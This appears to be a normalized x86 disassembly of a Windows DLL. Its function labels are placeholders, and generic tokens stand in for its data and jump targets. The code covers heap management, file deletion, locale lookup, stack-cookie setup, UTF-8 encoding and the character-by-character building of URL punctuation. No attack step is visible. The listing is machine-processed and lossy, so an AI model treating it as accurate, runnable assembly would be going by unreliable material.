mov [ ebp - 0x4 ] 0xbdb1e6
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x39
mov [ ebp - 0x4 ] 0x8abbe8
call sub_1002d420
mov [ eax ] 0x30
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xb49be7
call sub_1002d420
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x3a
mov [ ebp - 0x4 ] 0x878de5
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x2f
mov [ ebp - 0x4 ] 0xb09ce5
call sub_1002d420
mov [ eax ] 0x2e
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8bb8e4
call sub_1002d420
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x3f
mov [ ebp - 0x4 ] 0xaeaee5
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x26
mov [ ebp - 0x4 ] 0xbc99e7
call sub_1002d420
mov [ eax ] 0x2d
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xa8a1e8
call sub_1002d420
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x3d
mov [ ebp - 0x4 ] 0xb9a0e6
call sub_1002d420
mov [ eax ] 0x5f
mov esp ebp
pop ebp
retn
sub_1005a180
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1008a51f
mov eax [ fs : 0x0 ]
push eax
sub esp 0x3f0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x3e8 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x400 ]
mov [ fs : 0x0 ] eax
mov edi ecx
xor ebx ebx
mov [ esp + 0x14 ] edi
cmp [ edi + 0x8 ] ebx
jne r-xdata
mov [ esp + 0x1c ] ebx
mov [ esp + 0x20 ] ebx
mov [ esp + 0x24 ] ebx
mov [ esp + 0x408 ] ebx
lea eax [ esp + 0xc8 ]
mov ecx edi
lea esi [ esp + 0x34 ]
mov [ esp + 0x18 ] ebx
mov [ esp + 0x2c ] ebx
mov [ esp + 0xc8 ] ebx
mov [ esp + 0xcc ] ebx
mov [ esp + 0xd0 ] ebx
call sub_10030db0
mov [ esp + 0x408 ] 0x1
mov esi [ esp + 0xc8 ]
cmp esi ebx
je r-xdata
lea eax [ ebx + 0x1 ]
jmp r-xdata
lea edx [ esp + 0x19c ]
mov eax 0x13b
call sub_10069020
mov eax edx
push eax
lea ecx [ esp + 0x94 ]
lea ebx [ edi + 0xc ]
push ecx
call sub_10029ef0
add esp 0x8
mov edx eax
mov ecx 0x9
mov [ esp + 0x408 ] 0x2
call sub_10022b50
mov [ esp + 0x408 ] 0x1
cmp [ esp + 0xa4 ] 0x8
jb r-xdata
mov eax [ esp + 0x14 ]
mov edx [ esp + 0xcc ]
push eax
lea ecx [ esp + 0xd8 ]
push ecx
push edx
push esi
call sub_1001feb0
push esi
call sub_1000a86e
add esp 0x14
mov ecx [ esp + 0x400 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x3e8 ]
xor ecx esp
call sub_10032529
mov esp ebp
pop ebp
retn
mov edx [ esp + 0x14 ]
lea eax [ esp + 0x18 ]
push eax
lea ecx [ esp + 0x38 ]
push ecx
lea ecx [ esp + 0x34 ]
lea edi [ esp + 0x24 ]
call sub_100017a0
test eax eax
je r-xdata
mov edx [ esp + 0x90 ]
push edx
call sub_1000a86e
add esp 0x4
mov eax [ esp + 0x2c ]
cmp eax 0x1e84800
jge r-xdata
lea edx [ esp + 0xf4 ]
mov eax 0x14a
call sub_10069020
push edx
lea eax [ esp + 0x94 ]
push eax
call sub_10029ef0
add esp 0x8
mov edx eax
mov ecx 0x9
mov [ esp + 0x408 ] 0x3
call sub_10022b50
cmp [ esp + 0xa4 ] 0x8
jb r-xdata
lea edx [ esp + 0x30 ]
mov eax 0x114
call sub_10069020
mov ecx edx
push ecx
mov ecx [ rw-data ]
push edx
mov eax edx
push eax
push 0x1
push 0x1
push ecx
lea eax [ esp + 0x204 ]
mov [ esp + 0x2c ] 0x1
call sub_1005bf30
test eax eax
jne r-xdata
mov edx [ esp + 0x18 ]
push 0x0
push eax
mov eax [ rw-data ]
push edx
push eax
xor edx edx
xor ecx ecx
call sub_10003660
test eax eax
je r-xdata
lea eax [ esp + 0x34 ]
mov [ esp + 0x408 ] 0x0
call sub_10054bf0
mov esi [ esp + 0x1c ]
test esi esi
je r-xdata
mov ecx [ esp + 0x90 ]
push ecx
call sub_1000a86e
add esp 0x4
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov edx [ esp + 0x2c ]
mov eax [ esp + 0x18 ]
push edx
push eax
lea eax [ esp + 0x1f4 ]
call sub_1002f360
add esp 0x8
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
lea edx [ esp + 0xf4 ]
mov eax 0x99
call sub_10069020
mov ecx edx
push ecx
lea edx [ esp + 0xb0 ]
push edx
call sub_10029ef0
add esp 0x8
mov edx eax
mov ecx 0x9
mov [ esp + 0x408 ] 0x4
call sub_10022b50
lea ecx [ esp + 0xac ]
call sub_100702e0
lea eax [ esp + 0x34 ]
mov [ esp + 0x408 ] 0x0
call sub_10054bf0
lea esi [ esp + 0x1c ]
call sub_10030710
mov eax 0x3
jmp r-xdata
mov eax 0x2
jmp r-xdata
mov edi [ esp + 0x20 ]
mov eax esi
call sub_1006a100
push esi
call sub_1000a86e
add esp 0x4
mov esi [ esp + 0x1c ]
mov edi [ esp + 0x20 ]
cmp esi edi
je r-xdata
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov edi [ esp + 0x1c ]
mov esi [ esp + 0x20 ]
cmp edi esi
je r-xdata
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov esi [ esp + 0x14 ]
test esi esi
je r-xdata
mov edi edi
lea edx [ esp + 0xc8 ]
mov eax 0xf0
call sub_10069020
mov ecx edx
push ecx
lea edx [ esp + 0x94 ]
push edx
call sub_10029ef0
add esp 0x8
mov edx eax
mov ecx 0x9
mov [ esp + 0x408 ] 0x5
call sub_10022b50
cmp [ esp + 0xa4 ] 0x8
jb r-xdata
jmp r-xdata
lea eax [ esp + 0x1ec ]
push eax
call sub_10050cb0
mov esi eax
test esi esi
je r-xdata
lea edx [ esp + 0xf4 ]
mov eax 0x99
call sub_10069020
push esi
lea esi [ esp + 0xb0 ]
call sub_1001ddf0
add esp 0x4
mov esi eax
lea edx [ esp + 0xf4 ]
push edx
lea eax [ esp + 0x94 ]
push eax
mov [ esp + 0x410 ] 0x6
call sub_10029ef0
add esp 0x8
mov ecx eax
mov eax esi
lea edi [ esp + 0xc8 ]
mov [ esp + 0x408 ] 0x7
call sub_1006b070
mov ebx 0x8
mov edx eax
lea ecx [ ebx + 0x1 ]
mov [ esp + 0x408 ] bl
call sub_10022b50
cmp [ esp + 0xdc ] ebx
jb r-xdata
mov ecx [ esi + 0x1c ]
push ecx
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
add esi 0x24
cmp esi edi
jne r-xdata
lea eax [ esp + 0x34 ]
mov [ esp + 0x408 ] 0x0
call sub_10054bf0
mov ebx [ esp + 0x1c ]
test ebx ebx
je r-xdata
mov eax [ esp + 0x90 ]
push eax
call sub_1000a86e
add esp 0x4
jmp r-xdata
mov eax [ edi + 0x1c ]
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
add edi 0x24
cmp edi esi
jne r-xdata
lea eax [ esp + 0x1ec ]
push eax
call [ DeleteFileW@IAT ]
lea edx [ esp + 0x170 ]
mov eax 0xf0
call sub_10069020
mov ecx edx
push ecx
lea edx [ esp + 0xb0 ]
push edx
call sub_10029ef0
add esp 0x8
mov edx eax
mov ecx 0x9
mov [ esp + 0x408 ] 0xc
call sub_10022b50
cmp [ esp + 0xc0 ] 0x8
jb r-xdata
lea ecx [ esp + 0x1ec ]
push ecx
call [ DeleteFileW@IAT ]
lea edx [ esp + 0xf4 ]
mov eax 0x99
call sub_10069020
push esi
lea esi [ esp + 0xb0 ]
call sub_1001ddf0
add esp 0x4
mov esi eax
lea edx [ esp + 0xf4 ]
push edx
lea eax [ esp + 0xcc ]
push eax
mov [ esp + 0x410 ] 0x9
call sub_10029ef0
add esp 0x8
mov ecx eax
mov eax esi
lea edi [ esp + 0x90 ]
mov [ esp + 0x408 ] 0xa
call sub_1006b070
mov edx eax
mov ecx 0x9
mov [ esp + 0x408 ] 0xb
call sub_10022b50
mov esi 0x8
cmp [ esp + 0xa4 ] esi
jb r-xdata
xor edi edi
xor edx edx
mov esi 0x7
mov [ esp + 0xdc ] esi
mov [ esp + 0xd8 ] edi
mov [ esp + 0xc8 ] dx
cmp [ esp + 0xa4 ] ebx
jb r-xdata
mov ecx [ esp + 0xc8 ]
push ecx
call sub_1000a86e
add esp 0x4
xor eax eax
mov edi esi
mov eax ebx
call sub_1006a100
push ebx
call sub_1000a86e
add esp 0x4
mov esi [ esp + 0x20 ]
mov eax [ esp + 0xac ]
push eax
call sub_1000a86e
add esp 0x4
xor ebx ebx
xor edx edx
mov edi 0x7
mov [ esp + 0xa4 ] edi
mov [ esp + 0xa0 ] ebx
mov [ esp + 0x90 ] dx
cmp [ esp + 0xdc ] esi
jb r-xdata
mov ecx [ esp + 0x90 ]
push ecx
call sub_1000a86e
add esp 0x4
xor ecx ecx
mov [ esp + 0xa4 ] esi
mov [ esp + 0xa0 ] edi
mov [ esp + 0x90 ] cx
cmp [ esp + 0xc0 ] ebx
jb r-xdata
mov eax [ esp + 0x90 ]
push eax
call sub_1000a86e
add esp 0x4
xor ecx ecx
mov [ esp + 0xdc ] edi
mov [ esp + 0xd8 ] ebx
mov [ esp + 0xc8 ] cx
cmp [ esp + 0xc0 ] esi
jb r-xdata
mov eax [ esp + 0xc8 ]
push eax
call sub_1000a86e
add esp 0x4
lea eax [ esp + 0x34 ]
mov [ esp + 0x408 ] 0x0
call sub_10054bf0
mov esi [ esp + 0x1c ]
cmp esi edi
je r-xdata
mov edx [ esp + 0xac ]
push edx
call sub_1000a86e
add esp 0x4
lea eax [ esp + 0x34 ]
mov [ esp + 0x408 ] bl
call sub_10054bf0
mov esi [ esp + 0x1c ]
cmp esi ebx
je r-xdata
mov edx [ esp + 0xac ]
push edx
call sub_1000a86e
add esp 0x4
mov eax 0x4
jmp r-xdata
mov edi [ esp + 0x20 ]
mov eax esi
call sub_1006a100
push esi
call sub_1000a86e
add esp 0x4
mov eax 0x5
jmp r-xdata
mov edi [ esp + 0x20 ]
mov eax esi
call sub_1006a100
push esi
call sub_1000a86e
add esp 0x4
sub_1005a860
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebp + 0x14 ]
add ecx 0x8
push ecx
mov [ edi ] eax
mov edx [ ebx ]
push ebx
lea eax [ ebp - 0xc ]
push 0x0
push eax
mov [ ebp - 0x10 ] edx
call sub_10063545
mov esi eax
add esp 0x10
test esi esi
jg r-xdata
mov eax [ edi ]
mov ecx [ ebp + 0x10 ]
dec esi
sub ecx eax
cmp ecx esi
jge r-xdata
pop edi
pop esi
mov eax 0x2
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x10
test esi esi
jle r-xdata
mov edx [ ebp - 0x10 ]
pop edi
pop esi
mov [ ebx ] edx
mov eax 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x10
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn 0x10
push esi
lea ecx [ ebp - 0xc ]
push ecx
push eax
call sub_1007f580
add esp 0xc
add [ edi ] esi
sub_1005a906
mov edi edi
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
mov [ ebp - 0x4 ] ax
lea edi [ ebp - 0x2 ]
stosw [ edi ]
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push 0x22
call sub_1006e175
push [ eax + 0x14 ]
call [ GetLocaleInfoW@IAT ]
cmp [ ebp - 0x4 ] 0x30
pop edi
jne r-xdata
xor eax eax
cmp [ ebp - 0x4 ] 0x31
jne r-xdata
push 0x2
pop eax
leave
retn
cmp [ ebp - 0x4 ] 0x32
setne al
dec eax
and eax 0x3
leave
retn
inc eax
leave
retn
sub_1005a955
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push 0x40
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100661e0
add esp 0x18
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
leave
retn
or eax 0xffffffff
leave
retn
sub_1005a990
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1000ab70
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
add esp 0x4
sub_1005a9c0
mov edx [ ecx + 0x4 ]
push esi
push edi
mov edi [ ecx ]
sub edx edi
mov eax 0x38e38e39
imul edx
sar edx 0x3
mov esi edx
shr esi 0x1f
add esi edx
cmp esi 0x71c71c6
jbe r-xdata
mov edx [ ecx + 0x8 ]
sub edx edi
mov eax 0x38e38e39
imul edx
sar edx 0x3
mov eax edx
shr eax 0x1f
inc esi
add eax edx
cmp esi eax
jbe r-xdata
push r--data
call sub_10030594
pop edi
pop esi
retn
mov edx eax
shr edx 0x1
mov edi 0x71c71c7
sub edi edx
cmp edi eax
jae r-xdata
add eax edx
xor eax eax
jmp r-xdata
push eax
call sub_1003a000
mov eax esi
cmp eax esi
jae r-xdata
sub_1005aa2b
mov edi edi
push esi
push 0x1
mov esi 0xc0000417
push esi
push 0x2
call sub_1001a73c
add esp 0xc
push esi
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
pop esi
retn
sub_1005aa50
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x14 ]
mov [ eax ] 0x25
lea ecx [ eax + 0x1 ]
test bl 0x20
je r-xdata
test bl 0x10
je r-xdata
mov [ ecx ] 0x2b
inc ecx
mov dl [ ebp + 0x10 ]
mov [ ecx ] 0x2a2e
add ecx 0x2
test dl dl
je r-xdata
mov [ ecx ] 0x23
inc ecx
mov edx 0x3000
and ebx edx
cmp ebx 0x2000
jne r-xdata
mov [ ecx ] dl
inc ecx
cmp ebx edx
jne r-xdata
mov dl 0x66
jmp r-xdata
cmp ebx 0x1000
setne dl
lea edx [ edx + edx + 0x65 ]
mov dl 0x61
jmp r-xdata
mov [ ecx ] dl
mov [ ecx + 0x1 ] 0x0
pop ebx
pop ebp
retn
sub_1005aac0
push ebp
mov ebp esp
push ecx
mov eax [ ecx ]
mov edx [ eax + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
push esi
mov [ ebp - 0x4 ] 0x0
call edx
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_1005aae0
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_1002d290
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_10070050
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_10019750
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1005ab9c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
mov ebx 0xffff0000
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
or eax 0x4711
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_1005ac50
push ebp
mov ebp esp
push 0xffffffff
push sub_1008873b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x23c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
xor eax eax
cmp edx 0x5
ja r-xdata
or eax 0xffffffff
jmp [ edx * 4 + jump_table_1005ad5c ]
mov ecx [ ecx + 0x4 ]
push 0x104
lea eax [ ebp - 0x218 ]
push eax
push 0xffffffff
push ecx
push 0x1
push 0x0
call [ MultiByteToWideChar@IAT ]
lea edx [ ebp - 0x218 ]
push 0x5c
push edx
call sub_1006807b
add esp 0x8
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
cmp [ ecx + 0x24 ] eax
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
xor ecx ecx
lea edx [ ebp - 0x218 ]
lea edi [ ebp - 0x248 ]
lea esi [ ebp - 0x23c ]
mov [ ebp - 0x248 ] edx
mov [ ebp - 0x244 ] eax
mov [ ebp - 0x240 ] ecx
call sub_10019520
mov [ ebp - 0x4 ] 0x0
mov edi [ rw-data ]
add edi 0x1c
mov ecx esi
call sub_10028440
call sub_100603e0
push 0x104
add eax 0x2
push eax
lea eax [ ebp - 0x218 ]
push 0x104
push eax
call sub_1005bc2f
add esp 0x10
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_1005ada0
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
push ebx
push esi
push edi
cmp edx 0x7f
jg r-xdata
cmp edx 0x7ff
jg r-xdata
xor ebx ebx
mov [ ebp - 0x4 ] ebx
jmp r-xdata
cmp edx 0xffff
jg r-xdata
mov ebx 0x1
mov [ ebp - 0x4 ] 0xc0
jmp r-xdata
mov esi [ ebp + 0x10 ]
mov eax [ esi + 0x4 ]
mov ecx [ esi + 0x8 ]
lea eax [ eax + ebx + 0x1 ]
mov edi ecx
cmp edi eax
jae r-xdata
mov ebx 0x3
mov [ ebp - 0x4 ] 0xf0
mov ebx 0x2
mov [ ebp - 0x4 ] 0xe0
jmp r-xdata
cmp edi ecx
je r-xdata
add edi edi
cmp edi eax
jb r-xdata
mov eax [ esi + 0x4 ]
lea ecx [ ebx + ebx * 2 ]
add ecx ecx
sar edx cl
mov ecx [ esi ]
or dl [ ebp - 0x4 ]
mov [ eax + ecx ] dl
inc [ esi + 0x4 ]
mov edi [ esi + 0x4 ]
lea eax [ ebx - 0x1 ]
test eax eax
js r-xdata
mov ecx [ ebp + 0x8 ]
push edi
push ecx
call sub_10013bb0
mov edx [ esi + 0x4 ]
mov ecx [ esi ]
push edx
push ecx
push eax
mov [ ebp + 0x10 ] eax
call sub_1007f580
mov edx [ esi ]
mov eax [ ebp + 0x8 ]
push edx
push eax
call sub_1006db40
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
add esp 0x1c
mov [ esi ] ecx
mov [ esi + 0x8 ] edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ eax + eax * 2 ]
add ecx ecx
mov edx [ ebp + 0xc ]
mov ebx [ esi ]
sar edx cl
sub ecx 0x6
and dl 0x3f
or dl 0x80
mov [ edi + ebx ] dl
inc [ esi + 0x4 ]
dec eax
mov edi [ esi + 0x4 ]
jns r-xdata
sub_1005ae90
push ebp
mov ebp esp
push 0xffffffff
push sub_10089991
mov eax [ fs : 0x0 ]
push eax
sub esp 0x350
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
push 0x208
xor edi edi
lea ecx [ ebp - 0x2ec ]
push edi
push ecx
mov [ ebp - 0x358 ] eax
call sub_1007f8f0
add esp 0xc
lea ecx [ ebp - 0x2ec ]
call sub_10063850
mov esi eax
cmp esi edi
je r-xdata
push 0x144
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x344 ] eax
mov [ ebp - 0x4 ] 0x2
cmp eax edi
je r-xdata
lea edx [ ebp - 0x5c ]
lea eax [ edi + 0x62 ]
call sub_10069020
lea edx [ ebp - 0x324 ]
push esi
push edx
call sub_10057f20
push eax
lea edx [ ebp - 0x5c ]
lea esi [ ebp - 0x308 ]
mov [ ebp - 0x4 ] edi
call sub_10040e00
add esp 0xc
mov edx eax
lea ecx [ edi + 0x13 ]
mov [ ebp - 0x4 ] 0x1
call sub_10022b50
mov esi 0x8
cmp [ ebp - 0x2f4 ] esi
jb r-xdata
xor eax eax
push eax
call sub_10006be0
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x2f4 ] 0x7
mov [ ebp - 0x2f8 ] edi
mov [ ebp - 0x308 ] cx
cmp [ ebp - 0x310 ] esi
jb r-xdata
mov eax [ ebp - 0x308 ]
push eax
call sub_1000a86e
add esp 0x4
lea edi [ ebp - 0x344 ]
call sub_1006df00
mov esi eax
xor edi edi
cmp esi edi
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov esi [ ebp - 0x348 ]
cmp esi edi
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push eax
lea ecx [ ebp - 0x34c ]
mov [ ebp - 0x34c ] edi
mov [ ebp - 0x348 ] edi
call sub_100310b0
mov ebx 0x3
mov [ ebp - 0x4 ] ebx
mov esi [ ebp - 0x34c ]
cmp esi edi
jne r-xdata
mov eax 0x1
jmp r-xdata
mov edx [ ebp - 0x324 ]
push edx
call sub_1000a86e
add esp 0x4
lea ecx [ ebp - 0x2ec ]
push ecx
lea ecx [ ebp - 0x34c ]
mov [ ebp - 0x344 ] edi
call sub_1001ee70
mov esi eax
cmp esi edi
je r-xdata
lea edx [ ebp - 0x58 ]
mov eax 0x121
call sub_10069020
lea eax [ ebp - 0x324 ]
push esi
push eax
call sub_10057f20
push eax
lea edx [ ebp - 0x58 ]
lea esi [ ebp - 0x308 ]
mov [ ebp - 0x4 ] 0x4
call sub_10040e00
add esp 0xc
mov edx eax
lea ecx [ edi + 0x13 ]
mov [ ebp - 0x4 ] 0x5
call sub_10022b50
mov esi 0x8
cmp [ ebp - 0x2f4 ] esi
jb r-xdata
mov eax 0x2
jmp r-xdata
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
mov ebx [ ebp - 0x34c ]
call sub_10011800
mov esi eax
test esi esi
je r-xdata
lea edx [ ebp - 0xac ]
mov eax 0x15a
call sub_10069020
lea edx [ ebp - 0x308 ]
push esi
push edx
call sub_10057f20
push eax
lea edx [ ebp - 0xac ]
lea esi [ ebp - 0x324 ]
mov [ ebp - 0x4 ] 0x6
call sub_10040e00
add esp 0xc
mov edx eax
mov ecx 0x13
mov [ ebp - 0x4 ] 0x7
call sub_10022b50
mov ecx esi
call sub_100702e0
lea ecx [ ebp - 0x308 ]
mov [ ebp - 0x4 ] bl
call sub_100702e0
mov [ ebp - 0x344 ] 0x4
xor edx edx
mov [ ebp - 0x2f4 ] 0x7
mov [ ebp - 0x2f8 ] edi
mov [ ebp - 0x308 ] dx
cmp [ ebp - 0x310 ] esi
jb r-xdata
mov ecx [ ebp - 0x308 ]
push ecx
call sub_1000a86e
add esp 0x4
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
lea eax [ ebx + 0x12c ]
mov ebx [ ebp - 0x358 ]
call sub_10011cd0
mov edi eax
mov esi [ edi ]
test esi esi
jne r-xdata
lea edx [ ebp - 0xac ]
mov eax 0x79
call sub_10069020
lea eax [ ebp - 0x308 ]
push esi
push eax
call sub_10057f20
push eax
lea edx [ ebp - 0xac ]
lea esi [ ebp - 0x324 ]
mov [ ebp - 0x4 ] 0x8
call sub_10040e00
add esp 0xc
mov edx eax
mov ecx 0x13
mov [ ebp - 0x4 ] 0x9
call sub_10022b50
mov ecx esi
call sub_100702e0
lea ecx [ ebp - 0x308 ]
mov [ ebp - 0x4 ] 0x3
call sub_100702e0
mov [ ebp - 0x344 ] 0x5
jmp r-xdata
mov eax [ ebp - 0x350 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xa4 ]
mov eax 0x5b
call sub_10069020
lea edx [ ebp - 0xc8 ]
push esi
push edx
call sub_10057f20
push eax
lea edx [ ebp - 0xa4 ]
lea esi [ ebp - 0x340 ]
mov [ ebp - 0x4 ] 0x11
call sub_10040e00
add esp 0xc
mov edx eax
mov ecx 0x13
mov [ ebp - 0x4 ] 0x12
call sub_10022b50
mov ecx esi
call sub_100702e0
lea ecx [ ebp - 0xc8 ]
call sub_100702e0
mov [ ebp - 0x344 ] 0xa
lea eax [ ebp - 0x34c ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10039fc0
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x324 ]
push eax
call sub_1000a86e
add esp 0x4
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
call sub_10025990
push 0x58
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
lea edx [ ebp - 0xe4 ]
mov eax 0x8e
call sub_10069020
mov ecx edx
push ecx
lea ecx [ ebp - 0x324 ]
call sub_1004a920
lea edx [ ebp - 0x324 ]
lea ecx [ esi + 0x13 ]
mov [ ebp - 0x4 ] 0xa
call sub_10022b50
lea ecx [ ebp - 0x324 ]
mov [ ebp - 0x4 ] 0x3
call sub_100702e0
mov [ ebp - 0x344 ] 0x6
jmp r-xdata
mov esi [ ebp - 0x34c ]
call sub_100720b0
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0x34c ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10039fc0
mov eax [ ebp - 0x344 ]
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
xor eax eax
mov esi eax
call sub_10038d00
jmp r-xdata
lea edi [ ebp - 0x354 ]
lea ecx [ ebp - 0x350 ]
call sub_10031c90
mov esi eax
test esi esi
je r-xdata
lea edx [ ebp - 0xa4 ]
mov eax 0x76
call sub_10069020
lea eax [ ebp - 0x308 ]
push esi
push eax
call sub_10057f20
push eax
lea edx [ ebp - 0xa4 ]
lea esi [ ebp - 0x324 ]
mov [ ebp - 0x4 ] 0xb
call sub_10040e00
add esp 0xc
mov edx eax
mov ecx 0x13
mov [ ebp - 0x4 ] 0xc
call sub_10022b50
mov ecx esi
call sub_100702e0
lea ecx [ ebp - 0x308 ]
mov [ ebp - 0x4 ] 0x3
call sub_100702e0
mov [ ebp - 0x344 ] 0x7
jmp r-xdata
mov ebx [ ebp - 0x34c ]
mov [ edi ] eax
xor eax eax
lea edx [ ebp - 0x350 ]
push edx
lea ecx [ ebp - 0x354 ]
mov [ ebp - 0x350 ] eax
mov [ ebp - 0x354 ] eax
call sub_1002b180
mov esi eax
test esi esi
je r-xdata
mov edx [ ebp - 0x354 ]
mov eax [ ebp - 0x350 ]
push edx
push eax
lea eax [ ebp - 0x2ec ]
call sub_1002f360
mov esi eax
add esp 0x8
test esi esi
je r-xdata
lea edx [ ebp - 0x5c ]
mov eax 0xb0
call sub_10069020
lea ecx [ ebp - 0x308 ]
push esi
push ecx
call sub_10057f20
push eax
lea edx [ ebp - 0x5c ]
